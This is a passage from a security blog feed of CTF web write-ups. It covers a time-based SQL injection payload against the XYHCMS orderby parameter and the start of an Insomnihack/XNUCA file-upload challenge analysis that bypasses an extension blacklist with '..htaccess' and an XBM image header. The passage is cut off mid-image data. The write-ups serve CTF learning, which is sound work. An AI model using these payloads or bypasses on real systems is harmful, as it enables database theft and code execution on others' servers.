data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000752.png" alt=""></p><p>这样我们就成功构造了回显，然后用 smuggling 方法发送上面的请求就可以了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113000857.png" alt=""></p><p>给比我做的快的师傅递茶tql，自己还是做的太慢了orz…</p><p><strong>文中的POC仅供本次做题学习交流，切勿用于非法用途</strong></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>当时做完 bank_service 就去睡了，第二天醒来就结束就没看这道题，后来问了问前几的师傅们，是个 sql 注入的题。</p><p>一个CMS，官网是<a href="http://www.xyhcms.com/" target="_blank" rel="noopener">行云海CMS</a>，题目是最新的版本，然后我去看了一下，主要问题在<code>App/Api/Controller/LtController.class.php</code>当中，有好几个地方，比如</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gbooklist</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  ...</span><br><span class="line">true$order_by  = I(<span class="hljs-string">'orderby'</span>, <span class="hljs-string">'id DESC'</span>);</span><br><span class="line">  ...</span><br><span class="line">true$_list = M(<span class="hljs-string">'guestbook'</span>)-&gt;where($where)-&gt;order($order_by)-&gt;limit($limit)-&gt;select();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>对于 I 函数第二个参数并没有做任何的处理</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/**</span></span><br><span class="line"><span class="hljs-comment"> * 获取输入参数 支持过滤和默认值</span></span><br><span class="line"><span class="hljs-comment"> * 使用方法:</span></span><br><span class="line"><span class="hljs-comment"> * &lt;code&gt;</span></span><br><span class="line"><span class="hljs-comment"> * I('id',0); 获取id参数 自动判断get或者post</span></span><br><span class="line"><span class="hljs-comment"> * I('post.name','','htmlspecialchars'); 获取$_POST['name']</span></span><br><span class="line"><span class="hljs-comment"> * I('get.'); 获取$_GET</span></span><br><span class="line"><span class="hljs-comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $name 变量的名称 支持指定类型</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $default 不存在的时候默认值</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $filter 参数过滤方法</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $datas 要获取的额外数据源</span></span><br><span class="line"><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span><span class="hljs-params">($name,$default=<span class="hljs-string">''</span>,$filter=null,$datas=null)</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>于是我们可以访问<code>index.php?s=Api/lt/gbooklist&amp;orderby=1;SELECT SLEEP(5)%23</code>得到明显的时间延迟，这里我们就可以直接用 sqlmap 时间盲注就行了。</p><p>同样的，该文件里的<code>taglist</code>/<code>alist</code>/<code>slist</code>/<code>reviewlist</code>函数都有相同的地方存在注入，该题的 flag 也在数据库里面，所以用 sqlmap 跑跑就出来了。</p><p><strong>文中的POC仅供本次做题学习交流，切勿用于非法用途</strong></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;红帽杯 2019 Web Write Up (除 iCloudMusic&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XNUCA 2019 Qualifier Ezphp</title>
    <link href="https://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp/"/>
    <id>https://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp/</id>
    <published>2019-10-03T19:19:21.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>因为 Insomnihack 2019 l33t-hoster 这道题跟 XNUCA 2019 Qualifier Ezphp 如出一辙，比较类似，并且也是比较有意思的一题，所以两个题就放在一起写了</p><a id="more"></a><h1 id="L33T-HOSTER"><a href="#L33T-HOSTER" class="headerlink" title="L33T-HOSTER"></a>L33T-HOSTER</h1><p>题目在<code>?source</code>直接给出了源码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"source"</span>])) </span><br><span class="line">    <span class="hljs-keyword">die</span>(highlight_file(<span class="hljs-keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">"home"</span>])) {</span><br><span class="line">    $_SESSION[<span class="hljs-string">"home"</span>] = bin2hex(random_bytes(<span class="hljs-number">20</span>));</span><br><span class="line">}</span><br><span class="line">$userdir = <span class="hljs-string">"images/{$_SESSION["</span>home<span class="hljs-string">"]}/"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (!file_exists($userdir)) {</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$disallowed_ext = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">"php"</span>,</span><br><span class="line">    <span class="hljs-string">"php3"</span>,</span><br><span class="line">    <span class="hljs-string">"php4"</span>,</span><br><span class="line">    <span class="hljs-string">"php5"</span>,</span><br><span class="line">    <span class="hljs-string">"php7"</span>,</span><br><span class="line">    <span class="hljs-string">"pht"</span>,</span><br><span class="line">    <span class="hljs-string">"phtm"</span>,</span><br><span class="line">    <span class="hljs-string">"phtml"</span>,</span><br><span class="line">    <span class="hljs-string">"phar"</span>,</span><br><span class="line">    <span class="hljs-string">"phps"</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">"upload"</span>])) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">'image'</span>][<span class="hljs-string">'error'</span>] !== UPLOAD_ERR_OK) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"yuuuge fail"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[<span class="hljs-string">"image"</span>][<span class="hljs-string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="hljs-string">"image"</span>][<span class="hljs-string">"name"</span>];</span><br><span class="line">    $parts = explode(<span class="hljs-string">"."</span>, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($parts[<span class="hljs-number">0</span>])) {</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (count($parts) === <span class="hljs-number">0</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"lol filename is empty"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (in_array($ext, $disallowed_ext, <span class="hljs-keyword">TRUE</span>)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"lol nice try, but im not stupid dude..."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    <span class="hljs-keyword">if</span> (mb_strpos($image, <span class="hljs-string">"&lt;?"</span>) !== <span class="hljs-keyword">FALSE</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"why would you need php in a pic....."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!exif_imagetype($tmp_name)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"not an image."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($image_size[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || $image_size[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"lol noob, your pic is not l33t enough"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $name = implode(<span class="hljs-string">"."</span>, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . <span class="hljs-string">"."</span> . $ext);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;"</span>;</span><br><span class="line"><span class="hljs-keyword">foreach</span>(glob($userdir . <span class="hljs-string">"*"</span>) <span class="hljs-keyword">as</span> $file) {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/ul&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="hljs-string">"POST"</span> action=<span class="hljs-string">"?"</span> enctype=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"image"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">"submit"</span> name=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="XBM"><a href="#XBM" class="headerlink" title="XBM"></a>XBM</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>我们可以发现其实是一个黑名单过滤，然后我们再看一下 http 的响应报文中有这么一个字段：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可以先想到可能可以上传<code>.htaccess</code>，但是如果直接上传<code>.htaccess</code>的话，肯定会被直接 waf 掉</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$parts = explode(<span class="hljs-string">"."</span>, $name);</span><br><span class="line">$ext = array_pop($parts);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>explode</code>会将<code>$name</code>以<code>.</code>分割成数组</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">0</span>) <span class="hljs-string">""</span></span><br><span class="line">  [<span class="hljs-number">1</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">8</span>) <span class="hljs-string">"htaccess"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>array_pop</code>会把<code>$parts</code>数组最后一个元素取出，并将长度减一。所以如果直接上传<code>.htaccess</code>，得到的后缀将是<code>htaccess</code>，得到</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) {</span><br><span class="line">  [<span class="hljs-number">0</span>]=&gt;</span><br><span class="line">  string(<span class="hljs-number">0</span>) <span class="hljs-string">""</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>接着两个判断，第一个判断<code>$parts[0]</code>是否为空，为空就将<code>$parts[0]</code>移除数组，第二个判断<code>$parts</code>长度是否为 0 ，第三个判断<code>$ext</code>是否在黑名单里面</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($parts[<span class="hljs-number">0</span>])) {</span><br><span class="line">  array_shift($parts);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (count($parts) === <span class="hljs-number">0</span>) {</span><br><span class="line">  <span class="hljs-keyword">die</span>(<span class="hljs-string">"lol filename is empty"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (in_array($ext, $disallowed_ext, <span class="hljs-keyword">TRUE</span>)) {</span><br><span class="line">  <span class="hljs-keyword">die</span>(<span class="hljs-string">"lol nice try, but im not stupid dude..."</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>本题对于文件名的处理大致就是这么处理，所以直接传<code>.htaccess</code>会在第一个判断时把<code>$parts</code>全都置为空。</p><p>因为文件名分割是以<code>explode(".", $name);</code>分割，所以我们可以用多个点来进行绕过，例如可以用<code>..htaccess</code></p><p>接下来就是绕过后面的判断了，<code>exif_imagetype</code>绕过比较简单，可以直接使用 gif 的头<code>GIF98a</code>绕过就行了，但是后面的长度检测就比较麻烦了，这里 check 了文件内容的大小，而且重要的是<code>.htaccess</code>需要标准的格式，如果前面有非标准冗余的内容，<code>.htaccess</code>会解析失败。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$image_size = getimagesize($tmp_name);</span><br><span class="line"><span class="hljs-keyword">if</span> ($image_size[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || $image_size[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) {</span><br><span class="line"><span class="hljs-keyword">die</span>(<span class="hljs-string">"lol noob, your pic is not l33t enough"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们需要找到一个比较特殊的图片格式</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://camo.githubusercontent.com/d0d1c8f073751aaf07547ea779cc82a02052e3a5/68747470733a2f2f692e696d6775722e636f6d2f6f7857416341362e706e67" alt=""></p><p>查看 <a href="https://en.wikipedia.org/wiki/X_BitMap" target="_blank" rel="noopener">wiki</a> 我们可以知道</p><blockquote><p>​    XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, ‘0x13’ for example, so that multiple ASCII characters are used to express a single byte of image information</p></blockquote><p>并且在 wiki 中我们也可以得到一个 sample :</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 16</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 7</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> test_bits[] = {</span><br><span class="line"><span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>,</span><br><span class="line"><span class="hljs-number">0x00</span>, <span class="hljs-number">0x60</span> };</span><br></pre></td></tr></tbody></table></figure><p></p><p>XBM 文件竟然可以用<code>#define</code>来规定图片的 width &amp; height，而<code>#</code>在<code>.htaccess</code>文件中恰好是注释符，也不会引起解析错误，所以我们可以往这个方向去试一试。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGW